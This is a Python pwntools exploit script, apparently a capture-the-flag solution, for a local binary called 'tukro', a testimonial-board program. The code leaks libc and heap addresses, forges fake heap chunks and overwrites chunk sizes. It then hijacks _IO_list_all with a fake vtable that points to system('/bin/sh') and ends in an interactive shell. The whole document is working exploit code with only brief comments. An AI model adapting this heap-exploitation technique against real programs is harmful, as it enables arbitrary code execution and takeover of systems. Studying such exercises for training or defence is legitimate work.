from pwn import *

io = process("./tukro")

def sign_up(user,passw):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Username: ",str(user))
    io.sendlineafter("Password: ",str(passw))

def sign_in(user,passw):
    io.sendlineafter("Your choice: ","2")
    io.sendlineafter("Username: ",str(user))
    io.sendlineafter("Password: ",str(passw))


def add(recp,test):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Recipient Username: ",str(recp))
    io.sendlineafter("Testimonial: ",str(test))

def my_test():
    io.sendlineafter("Your choice: ","2")

def test_i(choice = "n",number=0,new=""):
    io.sendlineafter("Your choice: ","3")
    string = io.recvuntil("Edit Testimonial (y/N): ")
    io.sendline(choice)
    if(choice == "y"):
        io.sendlineafter("Testimonial Number: ",str(number))
        io.sendafter("New Testimonial: ",str(new))
    return string

def delete(number):
    io.sendlineafter("Your choice: ","4")
    io.sendlineafter("Testimonial Number: ",str(number))


def sign_out():
    io.sendlineafter("Your choice: ","5")


if __name__ == "__main__":
    sign_up("user","user")
    sign_up("second","second")
    sign_up("third","third")
    sign_in("user","user")

    add("second","aaaa")
    add("second","bbbb")
    add("second","cccc")
    add("second","dddd")
    add("second","eeee")
    add("second","ffff")
    add("second","gggg")
    add("second","hhhh")

    sign_out()
    sign_in("second","second")

    delete(1)
    delete(2)
    delete(3)
    sign_out()
    sign_in("user","user")
    string = test_i()
    string1 = string.split("\n")[-2]
    string2 = string.split("\n")[-5]
    libc_base = u64(string1+"\x00\x00")- 0x3c4b78
    log.info("libc @ "+str(hex(libc_base)))
    heap = u64(string2+"\x00\x00") - 0xa20
    log.info("heap @ "+str(hex(heap)))


    fd = heap + 0x1960     # changing the fd of a chunk to point to middle of another chunk
    payload= p64(heap)+p64(fd)
    test_i("y",7,payload)

    fd = libc_base + 0x3c4b78
    bk = heap + 0xa20
    payload = "\x00"*8+ p64(0x511) + p64(bk) + p64(fd)       # creating the fake chunk in the middle of another chunk

    test_i("y",3,payload)

    add("third","iiii")
    add("third","jjjj")               # taking chunks from the freelist
    payload = "llll"+"\x00"*1268 + p64(0x91)    # overwrites the next chunks size to 0x91
    add("third",payload)
    
    payload = "kkkk"+"\x00"*132+ p64(0x21)+ "\x00"*24 + p64(0x21)   # creates fake chunks infront of 0x91 chunk
    test_i("y",4,payload)
    sign_out()
    sign_in("second","second")

    delete(4)          # free 0x91 chunk

    sign_out()
    sign_in("user","user")
    payload = "llll"+"\x00"*1260 + "/bin/sh\x00" + p64(0x61)    # change the 0x91 size to 0x61   <-  testimonial 4
    test_i("y",11,payload)
   # add("third","1111")
    
    io_list = libc_base + 0x3c5520

    addr = heap + 0x1f30
    vtable = heap + 0x1f58
    system = libc_base + 0x45390
    payload = p64(0xdeadbeef) + p64(io_list - 0x10)
    payload += p64(0)*16 + p64(addr)
    payload += p64(0)*3 +p64(1) +p64(0)*2
    payload += p64(vtable) + p64(1)+p64(2)+p64(3)+ p64(0)*3 + p64(system)
    
    test_i("y",5,payload)
    #gdb.attach(io)
    
    add("third","1111")
    io.interactive()
